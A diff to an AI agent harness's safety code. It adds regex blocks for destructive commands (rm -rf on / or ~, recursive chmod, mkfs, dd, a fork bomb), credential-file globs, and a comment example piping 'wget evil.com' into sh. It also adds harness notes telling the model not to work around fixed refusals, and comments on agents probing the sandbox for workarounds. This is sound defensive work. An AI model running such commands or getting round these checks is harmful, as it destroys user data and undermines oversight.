@@ -958,9 +958,11 @@ def plan_tool_ran() -> bool:
 def reset_turn_counters() -> None:
     """Clear the per-turn blast-radius counters. Called by run_agent at the start
     of each turn; exposed so an embedder driving run_tool directly can reset too."""
-    global _turn_writes, _plan_tool_ran
+    global _turn_writes, _plan_tool_ran, _turn_blocker_counts, _pending_blocker_note
     _turn_writes = 0
     _plan_tool_ran = False
+    _turn_blocker_counts = {}
+    _pending_blocker_note = ""
 
 
 # ---------------------------------------------------------------------------
@@ -1041,6 +1043,18 @@ SENSITIVE_FILE_PATTERNS = [
 SENSITIVE_FILE_EXTENSIONS = frozenset([".pem", ".key", ".rsa", ".p12"])
 SENSITIVE_FILE_GLOBS = ["*_KEY*", "*_SECRET*", "*_TOKEN*", "*_PASSWORD*",
                         "*_key*", "*_secret*", "*_token*", "*_password*"]
+# Committed templates that document the variables and hold no values. Reading
+# one is how a project gets set up; the real .env it is copied to stays blocked.
+ENV_TEMPLATE_NAMES = frozenset([".env.example", ".env.sample", ".env.template", ".env.dist"])
+# The name globs above target secret-holding files (API_KEY.txt, github_token).
+# Source files with those words in their name -- count_tokens.py,
+# reset_password.py -- are code, and refusing them stopped the agent from
+# reading or creating ordinary files. Config/data formats stay covered.
+SOURCE_CODE_EXTENSIONS = frozenset([
+    ".py", ".pyi", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".jsx", ".go", ".rs",
+    ".java", ".kt", ".rb", ".php", ".c", ".h", ".cc", ".cpp", ".hpp", ".cs",
+    ".swift", ".scala", ".vue", ".svelte", ".html", ".css", ".md", ".rst",
+])
 
 # Shell startup files: writing one is arbitrary code execution on the user's
 # next shell launch, so writes are refused at the always-on floor — even in
@@ -1086,7 +1100,10 @@ def _is_sensitive_path(filepath: str) -> bool:
         if _resolve_allowed_path(allowed) == resolved:
             return False
 
-    # Exact filename match
+    # Exact filename match. An env template is judged by its directory alone,
+    # so ~/.ssh/.env.example is still refused.
+    if fn in ENV_TEMPLATE_NAMES:
+        fn, fp = "", str(Path(filepath).parent).lower()
     for pattern in SENSITIVE_FILE_PATTERNS:
         if pattern.lower() in fn or pattern.lower() in fp:
             return True
@@ -1098,6 +1115,8 @@ def _is_sensitive_path(filepath: str) -> bool:
 
     # Glob patterns
     import fnmatch
+    if Path(fn).suffix in SOURCE_CODE_EXTENSIONS:
+        return False
     for glob in SENSITIVE_FILE_GLOBS:
         if fnmatch.fnmatch(fn, glob):
             return True
@@ -1183,17 +1202,27 @@ def _dangerous_git_args(tokens: list) -> bool:
     if cursor >= len(tokens):
         return False
     action = tokens[cursor].lower()
-    flags = [token.lower() for token in tokens[cursor + 1:]]
+    raw = tokens[cursor + 1:]  # case matters below: -b/-B, -d/-D, -S/-s, -W
+    flags = [token.lower() for token in raw]
+    short = "".join(token[1:] for token in raw if token.startswith("-") and not token.startswith("--"))
+    forced = "f" in short or "--force" in flags
     return (
         action == "push"
         or (action == "reset" and "--hard" in flags)
-        or (action == "branch" and any(flag in ("-d", "-D", "--delete") for flag in flags))
+        # -d/--delete refuse a branch with unmerged work; only a forced delete loses it.
+        or (action == "branch" and ("d" in short.lower() or "--delete" in flags)
+            and ("D" in short or forced))
         or (action == "clean" and any("f" in flag.lstrip("-") for flag in flags if flag.startswith("-")))
-        or action in ("restore",)
+        # --staged alone only unstages; the working tree is untouched.
+        or (action == "restore" and not (
+            ("S" in short or "--staged" in flags)
+            and "W" not in short and "--worktree" not in flags))
+        # -b names a NEW branch, so the operands are names, not paths to overwrite.
+        # -B resets an existing branch and stays refused.
         or (action == "checkout" and (
             "--" in flags
-            or any(flag in ("-f", "--force") for flag in flags)
-            or any(not flag.startswith("-") for flag in flags)
+            or forced
+            or (any(not flag.startswith("-") for flag in flags) and "-b" not in raw)
         ))
         or (action == "switch" and any(
             flag in ("-f", "--force", "--discard-changes") for flag in flags))
@@ -1246,11 +1275,21 @@ def _outside_user_allowlist(command: str) -> bool:
 # Catastrophic commands that are blocked in ALL permission modes, including
 # edit mode. These cause irreversible damage: filesystem wipes, disk formats,
 # fork bombs, and remote-code-execution via pipe-to-shell at the root level.
+# A whole-system or whole-home target: / and ~ (also as $HOME / ${HOME}), each
+# optionally with a trailing / or /*, a top-level system directory, optionally
+# quoted. Must end the word, so ~/projects/old and /tmp/x stay ordinary.
+_WIPE_TARGET = (
+    r"""(["']?)(?:/\*?|(?:~|\$HOME|\$\{HOME\})(?:/\*?)?"""
+    r"|/(?:bin|boot|dev|etc|home|lib|lib64|opt|root|sbin|srv|usr|var"
+    r"|Users|System|Library|Applications)/?\*?)\1(?=\s|$)"
+)
 _UNRECOVERABLE_PATTERNS = [
-    # rm -rf / — wipe filesystem root (any flag order, --no-preserve-root, long/short)
-    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?(?:[^|;&<>]*\s)?/(?:\s|$)"),
-    # rm -rf ~ — wipe home dir
-    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?~(?:\s|$)"),
+    # rm -rf / ~ $HOME /* /usr ... — any flag order, --no-preserve-root, long/short
+    re.compile(r"\brm\s+(?:[^|;&<>]*\s)?-(?:[^-]*r|--recursive)(?:[^|;&<>]*\s)?(?:[^|;&<>]*\s)?"
+               + _WIPE_TARGET),
+    # chmod/chown/chgrp -R on the same targets: every file's mode or owner, unrecoverable
+    re.compile(r"\b(?:chmod|chown|chgrp)\s+(?:[^|;&<>]*\s)?-(?:[^-\s]*R|-recursive)"
+               r"(?:[^|;&<>]*\s)?" + _WIPE_TARGET),
     re.compile(r"\bmkfs(?:\.\w+)?\s+/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+)"),
     re.compile(r"\bdd\s+if=\S+\s+of=/dev/(?:sd[a-z]+|nvme\d+n\d+|vd[a-z]+|hd[a-z]+)"),
     re.compile(r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;"),
@@ -1339,7 +1378,82 @@ def _shell_web_urls(command: str):
     """
     if not _SHELL_WEB_CLIENT.search(command or ""):
         return None
-    return [match.group(0).rstrip(".,)]}") for match in _SHELL_HTTP_URL.finditer(command)]
+    urls = [match.group(0).rstrip(".,)]}") for match in _SHELL_HTTP_URL.finditer(command)]
+    if not urls and _web_client_only_mentioned(command):
+        return None
+    return urls
+
+
+def _shell_fetches_web(command: str) -> bool:
+    return _shell_web_urls(command) is not None
+
+
+# Commands that name a web client without running it: lookups, text search,
+# printing. Everything else that names one is treated as running it.
+_WEB_MENTION_LOOKUPS = frozenset([
+    "which", "where", "whereis", "type", "hash", "man", "help", "get-command", "gcm",
+    "grep", "egrep", "fgrep", "rg", "findstr", "echo", "printf", "dpkg", "apt-cache",
+])
+_WEB_CLIENT_INFO_FLAGS = frozenset(["--version", "-V", "--help", "-h"])
+_PACKAGE_MANAGERS = frozenset([
+    "apt", "apt-get", "dnf", "yum", "pacman", "zypper", "apk", "brew", "port", "pip",
+    "pip3", "pipx", "uv", "npm", "pnpm", "yarn", "winget", "choco", "scoop", "snap",
+    "conda", "gem", "cargo",
+])
+_GIT_TEXT_SUBCOMMANDS = frozenset(["commit", "log", "grep", "show", "diff", "status", "tag"])
+# Anything that can turn text into a command. Present anywhere, it voids the
+# exemption: `echo wget evil.com | sh` runs wget although only echo names it.
+_COMMAND_RUNNERS = frozenset([
+    "sh", "bash", "dash", "zsh", "ksh", "fish", "csh", "tcsh", "eval", "exec", "source",
+    "xargs", "env", "nohup", "time", "timeout", "nice", "watch", "parallel", "busybox",
+    "python", "python3", "py", "node", "deno", "bun", "perl", "ruby", "php", "pwsh",
+    "powershell", "cmd", "iex", "invoke-expression", "find",
+])
+
+
+def _web_client_only_mentioned(command: str) -> bool:
+    """True when every curl/wget/... in the command is named, never run.
+
+    `command -v wget`, `grep curl src/`, `apt-get install curl` and
+    `git commit -m 'drop curl'` were refused as URL-less fetches, so an agent
+    could not even check which tools exist. Conservative by construction: any
+    substitution, newline, runner, or unlexable input keeps the refusal.
+    """
+    if re.search(r"\$\(|`|[<>]\(|[\r\n]", command):
+        return False
+    parts = _lex_command(command)
+    if not parts:
+        return False
+    segments, current = [], []
+    for part in parts + [";"]:
+        if part in (";", "&&", "||", "&", "|"):
+            if current:
+                segments.append(current)
+            current = []
+        else:
+            current.append(part)
+    for segment in segments:
+        if segment[0] == "sudo" and len(segment) > 1 and not segment[1].startswith("-"):
+            segment = segment[1:]
+        exe = Path(segment[0]).stem.lower()
+        if segment[0] == "." or exe in _COMMAND_RUNNERS:
+            return False
+        if not _SHELL_WEB_CLIENT.search(" ".join(segment)):
+            continue
+        rest = segment[1:]
+        named_only = (
+            exe in _WEB_MENTION_LOOKUPS
+            or (exe == "command" and rest[:1] in (["-v"], ["-V"]))
+            or (exe in ("curl", "wget", "httpie", "http", "https", "lynx", "w3m")
+                and bool(rest) and all(arg in _WEB_CLIENT_INFO_FLAGS for arg in rest))
+            or (exe in _PACKAGE_MANAGERS
+                and any(arg.lower() in ("install", "add") for arg in rest[:3]))
+            or (exe == "pacman" and rest[:1] and rest[0].startswith("-S"))
+            or (exe == "git" and rest[:1] and rest[0] in _GIT_TEXT_SUBCOMMANDS)
+        )
+        if not named_only:
+            return False
+    return True
 
 
 # Beyond this length a command is not something a person is reasonably asking
@@ -4237,6 +4351,24 @@ SUBAGENT_SPECS = load_subagent_specs(AGENTS_DIR, USER_AGENTS_DIR)
 # Left None, sub-agents run silently (benchmark, one-shot, plain REPL) — so this
 # is fully backward-compatible. Kept out of the loop, same as every other hook.
 subagent_ui = None
+# Front-end hook: the commands the person can type (CLI slash commands, gateway
+# /approve and friends), as name -> (usage, description). Each front end
+# registers its own table at start-up; empty here, so the engine knows none.
+# Without it the model, asked "what does /local do", said no such command
+# existed -- it only ever sees tool schemas.
+FRONTEND_COMMANDS = {}
+
+
+def register_frontend_commands(commands: dict) -> None:
+    """Replace the command table describe_tool and per-turn facts read from.
+
+    Each value is (usage, description) or (usage, description, details), where
+    details spells out every subcommand -- without it the model invents them.
+    """
+    global FRONTEND_COMMANDS
+    FRONTEND_COMMANDS = {
+        str(name).lstrip("/").lower(): tuple(str(part) for part in (*entry, "")[:3])
+        for name, entry in dict(commands).items()}
 # Human-in-the-loop hook: a presentation layer (e.g. Rich CLI) may set this to
 #   human_input_handler(question, reason) -> str
 # to present an interactive prompt with terminal UI controls (e.g. pausing spinners).
@@ -4702,8 +4834,191 @@ def _exec_shell_command(command: str, timeout: int = 25, image: str = "") -> str
     return _exec_sandbox_command(command, timeout=timeout, image=image)
 
 
+# What a closed sandbox network looks like from inside: DNS that never answers
+# (Docker --network none), the native runtime's proxy refusing the tunnel, or no
+# route at all. curl, wget, Python, pip, npm and Windows each word it differently.
+_SANDBOX_NETWORK_FAILURE_RE = re.compile(
+    r"could not resolve host|unable to resolve host address|temporary failure in name resolution"
+    r"|name or service not known|nodename nor servname|getaddrinfo (?:failed|ENOTFOUND|EAI_AGAIN)"
+    r"|network is unreachable|failed to establish a new connection"
+    r"|tunnel connection failed|CONNECT tunnel failed"
+    # Windows: DNS (curl.exe, PowerShell) and the sandbox firewall (WinError 10013).
+    r"|no such host is known|remote name could not be resolved"
+    r"|forbidden by its access permissions",
+    re.IGNORECASE,
+)
+# --- Config blockers ----------------------------------------------------------
+# A refusal caused by a config.txt setting reads, to the model, like an obstacle
+# to get around: a real run spent its whole turn on workarounds for a download
+# the sandbox could never make. Told about the limits up front, a small model
+# gives up before trying. So each kind of refusal is counted per turn and, at the
+# third, one note says which setting is responsible and that only the user can
+# change it -- the same shape as the denial breaker. Notes name settings and what
+# the model already tried (a host, a path), never a URL path, query or config
+# value, and credential or fixed-rule refusals never name a way to unlock them.
+CONFIG_BLOCKER_NOTE_AFTER = 3
+_turn_blocker_counts = {}
+_pending_blocker_note = ""
+_FIXED_RULE_NOTE = ("This was refused by a fixed safety rule; no setting or approval "
+                    "changes it. Do not look for another way to do the same thing. "
+                    "Tell the user plainly what you could not do.")
+_PROTECTED_NOTE = ("This is a protected file or credential, refused by a fixed safety "
+                   "rule; no setting or approval changes it here. Do not look for "
+                   "another way to read, write or send it. If the user needs it, they "
+                   "can open it themselves.")
+_TIMEOUT_RE = re.compile(r"Command timed out after \d+s")
+
+
+def _config_file() -> str:
+    """Where the user edits settings, always naming config.txt even when
+    AGENT8088_CONFIG points at a file called something else."""
+    return str(CONFIG_PATH) if CONFIG_PATH.name == "config.txt" else f"config.txt ({CONFIG_PATH})"
+
+
+def _count_blocker(kind: str) -> bool:
+    """Count one refusal of this kind; True exactly when it reaches the threshold."""
+    _turn_blocker_counts[kind] = _turn_blocker_counts.get(kind, 0) + 1
+    return _turn_blocker_counts[kind] == CONFIG_BLOCKER_NOTE_AFTER
+
+
+def _blocker_note(text: str) -> str:
+    return (f"\n{_HARNESS_PREFIX}Refused {CONFIG_BLOCKER_NOTE_AFTER} times this turn. "
+            f"{text}")
+
+
+def _internal_host_note(url: str) -> tuple:
+    """The SSRF refusal's note. Offers ssrf_allow_hosts only for a literal LAN or
+    loopback address the user may run a service on -- never a name (it could
+    resolve anywhere) and never the link-local cloud-metadata range."""
+    import ipaddress
+    parts = urllib.parse.urlsplit(url)
+    host = parts.hostname or ""
+    try:
+        port = parts.port or (443 if parts.scheme == "https" else 80)
+        ip = ipaddress.ip_address("127.0.0.1" if host == "localhost" else host)
+    except ValueError:
+        return "fixed_rule", _FIXED_RULE_NOTE
+    if ip.is_link_local or not (ip.is_private or ip.is_loopback):
+        return "fixed_rule", _FIXED_RULE_NOTE
+    return "ssrf", (f"`{host}` is on a private or local network, which web tools may "
+                    "not reach by default. If it is the user's own service, only they "
+                    f"can allow that one address with `ssrf_allow_hosts={host}:{port}` in "
+                    f"{_config_file()}. Stop retrying; tell the user.")
+
+
+def _config_blocker(reason: str, detail: str):
+    """(kind, note text) for a refusal a person could act on, else None."""
+    if reason == "blocked_path":
+        return "blocked_path", (f"Writing to `{detail}` is blocked by `blocked_paths` in "
+                                f"{_config_file()}. Only the user can change that list. Stop "
+                                "retrying; write somewhere else or tell the user.")
+    if reason == "hard_blocked_shell":
+        if _matches_user_deny(detail):
+            return "deny_commands", ("This command matches the user's own `deny_commands` "
+                                     f"rule in {_config_file()}. Only the user can change it. "
+                                     "Stop retrying; tell the user.")
+        if _outside_user_allowlist(detail):
+            return "allow_commands", ("Only commands matching `allow_commands` in "
+                                      f"{_config_file()} may run, and this one does not. Only "
+                                      "the user can change that list. Stop retrying; "
+                                      "tell the user.")
+        return "fixed_rule", _FIXED_RULE_NOTE
+    if reason in ("sensitive_path", "shell_startup_file", "sensitive_query", "outbound_secret"):
+        return "protected", _PROTECTED_NOTE
+    if reason == "egress_policy":
+        if _egress_check(detail):
+            host = urllib.parse.urlsplit(detail).hostname or "this host"
+            return "egress_domains", (f"`{host}` is outside the web domain policy "
+                                      "(`allowed_domains` / `blocked_domains` in "
+                                      f"{_config_file()}). Only the user can change it. "
+                                      "Stop retrying; tell the user.")
+        return _internal_host_note(detail)
+    return None
+
+
+def _note_config_blocker(reason: str, detail: str) -> None:
+    """Called for every audited refusal. Never raises: it only adds advice."""
+    global _pending_blocker_note
+    try:
+        found = _config_blocker(reason, detail)
+        if found and _count_blocker(found[0]):
+            _pending_blocker_note = _blocker_note(found[1])
+    except Exception as exc:  # noqa: BLE001 — advice must never break a refusal
+        _log.debug("config blocker note failed: %s", exc)
+
+
+def _take_blocker_note() -> str:
+    global _pending_blocker_note
+    note, _pending_blocker_note = _pending_blocker_note, ""
+    return note
+
+
+def _turn_limit_reason(limit: int) -> str:
+    """Footer for a run that hit max_turns. The user reads it, so it says how
+    to raise the limit -- first-run users hit it repeatedly with no way to know."""
+    return (f"reached the {limit}-turn limit before completing the task -- raise it "
+            "with /maxturns, or max_turns in config.txt")
+
+
+def _timeout_note(result: str) -> str:
+    if not _TIMEOUT_RE.search(result or "") or not _count_blocker("timeout"):
+        return ""
+    return _blocker_note(
+        f"Commands are capped at `max_tool_timeout_seconds` ({MAX_TOOL_TIMEOUT_SECONDS}s). "
+        "A call may pass a larger `timeout` up to that cap; beyond it, only the user can "
+        f"raise it, with /limits or in {_config_file()}. Otherwise narrow the command.")
+
+
+def _sandbox_network_note(result: str, source: str) -> str:
+    """The note to append when sandboxed code keeps hitting the closed network.
+
+    The sandbox reaches only the hosts in sandbox_allowed_domains (none by
+    default; none at all on the Docker fallback), and nothing in a failed fetch
+    says so. Counted like every other config blocker.
+    """
+    if not _SANDBOX_NETWORK_FAILURE_RE.search(result or ""):
+        return ""
+    if not _count_blocker("sandbox_network"):
+        return ""
+    hosts = sorted({urllib.parse.urlsplit(url).hostname or ""
+                    for url in _SHELL_HTTP_URL.findall(source or "")} - {""})
+    needed = ", ".join(hosts) or "the host this task needs"
+    allowed = ", ".join(SANDBOX_ALLOWED_DOMAINS) or "none"
+    if _resolve_sandbox_backend() == "docker":
+        setting = ("Commands are running in the Docker fallback, which has no network "
+                   "at all, because the native sandbox is not set up. The user can "
+                   "set it up with `agent8088 --sandbox-setup` (on Linux it needs "
+                   "bubblewrap, socat and ripgrep), then add "
+                   f"`sandbox_allowed_domains={needed}` to {_config_file()}.")
+    else:
+        setting = (f"Sandboxed commands reach only the hosts in `sandbox_allowed_domains` "
+                   f"in {_config_file()} (currently: {allowed}). The user can add "
+                   f"`sandbox_allowed_domains={needed}` there and restart Agent8088.")
+    return (f"\n{_HARNESS_PREFIX}The sandbox has blocked network access "
+            f"{CONFIG_BLOCKER_NOTE_AFTER} times this turn. This is a setting, not a "
+            f"problem to work around. {setting} Only the user can change config.txt. "
+            "Stop retrying the download; tell the user what this task needs and "
+            "that they can change the setting or fetch the file themselves.")
+
+
 def _process_display(argv: list) -> str:
     return subprocess.list2cmdline(argv) if sys.platform == "win32" else shlex.join(argv)
+
+
+def _python_snippet_command(code: str) -> str:
+    """Shell command line that runs a Python snippet, newlines and all.
+
+    cmd.exe ends a command at its first newline, so `python -c "<code>"` ran
+    only the first line of a multi-line snippet and reported success with no
+    output. Passing the source base64-encoded keeps the command on one line and
+    free of quotes on every platform.
+    """
+    import base64
+
+    encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
+    loader = ("import base64;exec(compile(base64.b64decode("
+              f"'{encoded}').decode('utf-8'),'<sandbox>','exec'))")
+    return _process_display([sys.executable, "-c", loader])
 
 
 # Auth failures git reports once prompting is disabled. Each is a dead end the
@@ -8642,6 +8957,32 @@ def _artifact_workspace_command(command: str) -> str:
     )
 
 
+# "Permission denied" only in the filesystem's own wording -- Python's
+# "[Errno 13] Permission denied" or coreutils/bash's "<path>: Permission
+# denied". An API or registry saying it ({"message": "Permission denied"},
+# npm's "403 Forbidden - ... - Permission denied") is not the sandbox.
+_SANDBOX_DENIED_RE = re.compile(
+    r"Access is denied|os error (?:5|13)\b|EACCES|EPERM"
+    r"|(?:\[Errno 13\] |: )Permission denied(?! \(publickey\))")
+
+
+def _explain_sandbox_denial(result: str, workspace: Path) -> str:
+    """Say where the sandbox lets a command write when it was refused access.
+
+    "Access is denied" alone does not tell the model the boundary is deliberate,
+    so a real run spent ~12 turns probing folders for a uv cache, a venv and a
+    downloaded interpreter. Naming the boundary once ends that search.
+    """
+    if not _SANDBOX_DENIED_RE.search(result or "") or "[sandbox]" in result:
+        return result
+    return (f"{result}\n[sandbox] Shell commands may write only to {workspace} and "
+            "the sandbox temp folder; everything else is read-only, and programs "
+            "outside the agent's own runtime may be refused. Creating virtual "
+            "environments or installing packages from the shell will not work "
+            "here: keep outputs under that folder, use the packages the agent's "
+            "Python already has, or ask the user to install what is missing.")
+
+
 def _exec_sandbox_command(command: str, timeout: int = 25,
                           python_code: bool = False, image: str = "") -> str:
     """Run in the sandbox; when Docker serves, say so in the result, so the
@@ -8668,28 +9009,35 @@ def _run_sandbox_command(command: str, timeout: int = 25,
                             ".env*", "*.pem", "*.key", "*.p12", "__pycache__"))
         command = command.replace(str(ARTIFACTS_ROOT), str(workspace))
     try:
-        if backend == "native":
-            if not _native_sandbox_ready(workspace, readonly=_sandbox_readonly):
-                return (_exec_docker_command(command, timeout, python_code, image,
-                                             workspace=workspace)
-                        if _docker_usable() else _sandbox_required_error())
-            local_command = (
-                _process_display([sys.executable, "-c", command])
-                if python_code else command
-            )
-            return _native_or_docker(
-                lambda: _exec_native_sandbox(
-                    local_command, timeout, workspace, readonly=_sandbox_readonly,
-                ),
-                lambda: _exec_docker_command(
-                    command, timeout, python_code, image, workspace=workspace,
-                ),
-            )
-        return _exec_docker_command(command, timeout, python_code, image,
-                                    workspace=workspace)
+        return _explain_sandbox_denial(
+            _run_in_sandbox_backend(backend, command, timeout, python_code, image,
+                                    workspace),
+            ARTIFACTS_ROOT if temporary is None else workspace)
     finally:
         if temporary:
             temporary.cleanup()
+
+
+def _run_in_sandbox_backend(backend: str, command: str, timeout: int,
+                            python_code: bool, image: str, workspace: Path) -> str:
+    if backend == "native":
+        if not _native_sandbox_ready(workspace, readonly=_sandbox_readonly):
+            return (_exec_docker_command(command, timeout, python_code, image,
+                                         workspace=workspace)
+                    if _docker_usable() else _sandbox_required_error())
+        local_command = (
+            _python_snippet_command(command) if python_code else command
+        )
+        return _native_or_docker(
+            lambda: _exec_native_sandbox(
+                local_command, timeout, workspace, readonly=_sandbox_readonly,
+            ),
+            lambda: _exec_docker_command(
+                command, timeout, python_code, image, workspace=workspace,
+            ),
+        )
+    return _exec_docker_command(command, timeout, python_code, image,
+                                workspace=workspace)
 
 
 def install_native_sandbox() -> str:
@@ -8774,6 +9122,23 @@ def _is_missing_argument_error(result: str) -> bool:
     read it as the step having failed.
     """
     return bool(_MISSING_ARG_RE.match((result or "").lstrip()))
+
+
+def _parse_error_args(raw: str) -> dict:
+    """Arguments marking an unparseable ARGS block, with where it broke.
+
+    The position matters: a large write whose content has one unescaped quote
+    is fixable by the model only if it is told where the JSON stopped parsing.
+    """
+    args = {"__parse_error__": raw[:400]}
+    try:
+        json.loads(raw)
+    except ValueError as error:
+        pos = getattr(error, "pos", None)
+        if pos is not None:
+            args["__parse_error_at__"] = (f"{error.msg} at char {pos}, near "
+                                          f"{raw[max(0, pos - 60):pos + 20]!r}")
+    return args
 
 
 def _is_parse_error_result(result: str) -> bool:
@@ -9579,6 +9944,18 @@ def _budget_capped_timeout(timeout: int) -> int:
 
 
 def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> str:
+    _take_blocker_note()  # a refusal audited outside run_tool must not attach here
+    result = _run_tool(name, args, allow_plan, depth)
+    if not isinstance(result, str) or result.startswith("ESCALATION_REQUEST"):
+        return result
+    # Outside any untrusted-content wrapper, so it reads as the harness speaking.
+    # Only command runners count timeouts: a file that merely contains the phrase
+    # must not.
+    runs_commands = (TOOL_SPECS.get(name) or {}).get("mode") in ("shell", "docker")
+    return result + (_take_blocker_note() or (_timeout_note(result) if runs_commands else ""))
+
+
+def _run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> str:
     global _remote_git_grant, _turn_writes
     spec = TOOL_SPECS.get(name)
     if not spec:
@@ -10291,7 +10668,8 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
         return _exec_cron(args)
 
     if mode == "docker":
-        return _exec_docker(args)
+        result = _exec_docker(args)
+        return result + _sandbox_network_note(result, str(args.get("code") or ""))
 
     if mode == "browser":
         return _exec_browser(args)
@@ -10547,7 +10925,9 @@ def run_tool(name: str, args: dict, allow_plan: bool = True, depth: int = 0) -> 
             text = testing_support.trim_output(text)
         _record_verdict(ledger_command or command, text)
         _record_localization_requirement(name, command, text)
-        return _wrap_untrusted(text, f"shell command: {_redact_secrets(command[:160])}")
+        # Host tools have the real network; only the sandbox's closed one is a setting.
+        note = "" if spec.get("host") else _sandbox_network_note(text, command)
+        return _wrap_untrusted(text, f"shell command: {_redact_secrets(command[:160])}") + note
 
     return f"Unknown tool mode '{mode}' for tool '{name}'"
 
@@ -10721,7 +11101,15 @@ def _escape_invalid_backslashes(raw: str) -> str:
                               and all(c in "0123456789abcdefABCDEF"
                                       for c in raw[index + 2:index + 6]))
             if following in '"\\/bfnrt' or unicode_escape:
-                out.append(char)
+                # Keep the pair and step over it: re-reading the escaped char
+                # would let `\"` close the string and `\\U` look invalid.
+                out.append(char + following)
+                index += 2
+                continue
+            if following == "'":
+                # JSON has no \' escape; models carry it over from Python and
+                # mean a plain quote, not a literal backslash.
+                pass
             else:
                 out.append("\\\\")
         else:
@@ -10737,9 +11125,40 @@ def _loads_tool_args(raw: str):
     so callers can distinguish "unparseable" from "no arguments given".
     """
     try:
-        return json.loads(raw)
+        parsed = json.loads(raw)
     except ValueError:
-        return json.loads(_escape_control_chars_in_strings(_escape_invalid_backslashes(raw)))
+        parsed = json.loads(_escape_control_chars_in_strings(_escape_invalid_backslashes(raw)))
+    return _unwrap_args_envelope(parsed)
+
+
+_ARGS_ENVELOPE_RE = re.compile(r"^\W*ARGS\W*?:?\s*(?=\{)")
+
+
+def _unwrap_args_envelope(parsed):
+    """Recover the real arguments a model nested inside an ✿ARGS✿ envelope.
+
+    Native-tool models that see ✿FUNCTION✿/✿ARGS✿ lines in their history copy
+    the marker into the native arguments: {"ARGS": "{...}"},
+    {"✿ARGS✿: {...}": ""} or {"": "ARGS✿: {...}"} (all observed from glm-5.3).
+    Taken literally, the tool sees no arguments and blames the model for an
+    omission it did not make.
+    """
+    if not (isinstance(parsed, dict) and len(parsed) == 1):
+        return parsed
+    key, value = next(iter(parsed.items()))
+    for text in (key, value):
+        if not isinstance(text, str):
+            continue
+        match = _ARGS_ENVELOPE_RE.match(text)
+        if not match and not (text is value and key.strip("✿: ") == "ARGS"):
+            continue
+        try:
+            inner = _loads_tool_args(text[match.end() if match else 0:])
+        except ValueError:
+            continue
+        if isinstance(inner, dict):
+            return inner
+    return parsed
 
 
 _MARKDOWN_FENCE_RE = re.compile(r"(^```[^\n]*\n.*?^```[ \t]*$)", re.MULTILINE | re.DOTALL)
@@ -10838,7 +11257,7 @@ def _args_after_function_marker(text: str, name: str):
         # An argument object was clearly intended but is broken. Same reason
         # as the ✿ARGS✿ path: flag the parse failure rather than let it look
         # like the model passed nothing.
-        return {"__parse_error__": raw_args[:400]}
+        return _parse_error_args(raw_args)
 
 
 def find_tool_calls(text: str, allowed: set = None) -> list:
@@ -10883,8 +11302,7 @@ def find_tool_calls(text: str, allowed: set = None) -> list:
                 # args here would make the tool report the argument as
                 # missing, which sends the model chasing the wrong problem.
                 # Flag the parse failure instead.
-                calls.append({"name": resolved,
-                              "arguments": {"__parse_error__": raw_args[:400]}})
+                calls.append({"name": resolved, "arguments": _parse_error_args(raw_args)})
         # An ✿ARGS✿ block that is not a JSON object matches no header above (they
         # require a '{'), and the loose-line branch below skips it because ✿ARGS✿
         # IS present — so the call was dropped and the model saw no result at
@@ -10895,7 +11313,7 @@ def find_tool_calls(text: str, allowed: set = None) -> list:
                 resolved = _resolve_tool_name(loose.group(1))
                 if resolved in allowed:
                     calls.append({"name": resolved,
-                                  "arguments": {"__parse_error__": loose.group(2).strip()[:400]}})
+                                  "arguments": _parse_error_args(loose.group(2).strip())})
         # A loose ✿FUNCTION✿ line with no ✿ARGS✿ marker. "No marker" is NOT
         # proof the model passed no arguments — it may have put them in a
         # following fence or on the next line bare, so look for the object
@@ -11403,6 +11821,77 @@ def _recalled_memory_prompt(messages, system_prompt, identity=None):
     return with_memory
 
 
+# A slash command as a word of its own: not a path (/usr/local), a URL's path
+# (https://x/local) or a home path (~/local).
+_SLASH_MENTION_RE = re.compile(r"(?<![\w/:.~])/([a-z][\w-]*)(?![\w/.-])", re.IGNORECASE)
+MAX_MENTION_FACTS = 8
+_TOOL_FAMILY_FACTS = 6
+_MENTION_HEADER = ("## What the user's message refers to\n"
+                   "Facts from Agent8088's own command and tool registry. Answer from "
+                   "these; do not guess.\n")
+
+
+def _tool_fact(name: str) -> str:
+    """One line: what the tool is for and how it is called (optional args in [])."""
+    spec = TOOL_SPECS[name]
+    description = str(spec.get("description") or "").split(". ")[0].rstrip(".")
+    optional = set(spec.get("optional") or ())
+    args = ", ".join(f"[{a}]" if a in optional else a for a in spec.get("args") or ())
+    return f"- tool `{name}({args})`: {description}."
+
+
+def _mentioned_capability_facts(text: str) -> list:
+    """Registry facts for the commands and tools a message names.
+
+    Only names are taken from the message; every fact comes from a registry.
+    An unknown slash word is reported only when it is a near miss for a real
+    command (/seatch), so "what's in /etc" draws no false "no such command".
+    """
+    facts = []
+    for word in dict.fromkeys(m.lower() for m in _SLASH_MENTION_RE.findall(text or "")):
+        if word in FRONTEND_COMMANDS:
+            usage, description, details = FRONTEND_COMMANDS[word]
+            about = " ".join(part for part in (description.rstrip(".") + ".", details) if part)
+            facts.append(f"- `{usage}`: {about} (a command the user types; "
+                         "not a tool you can call)")
+        elif close := _close_commands(word, cutoff=0.75)[:1]:
+            facts.append(f"- /{word}: no such command; the user probably means "
+                         f"/{close[0]}: {FRONTEND_COMMANDS[close[0]][1]}")
+    # Words joined the way tool names are, so "cli anything" finds cli_anything_*.
+    joined = "_" + re.sub(r"[\s\-]+", "_", (text or "").lower()) + "_"
+    named = [name for name in TOOL_SPECS
+             if "_" in name and re.search(rf"(?<![a-z0-9]){re.escape(name)}(?![a-z0-9])", joined)]
+    facts.extend(_tool_fact(name) for name in named)
+    families = Counter("_".join(name.split("_")[:2]) for name in TOOL_SPECS
+                       if name.count("_") >= 2)
+    for family, size in families.items():
+        if size >= 3 and re.search(rf"(?<![a-z0-9]){re.escape(family)}(?![a-z0-9])", joined):
+            members = [n for n in TOOL_SPECS if n.startswith(family + "_") and n not in named]
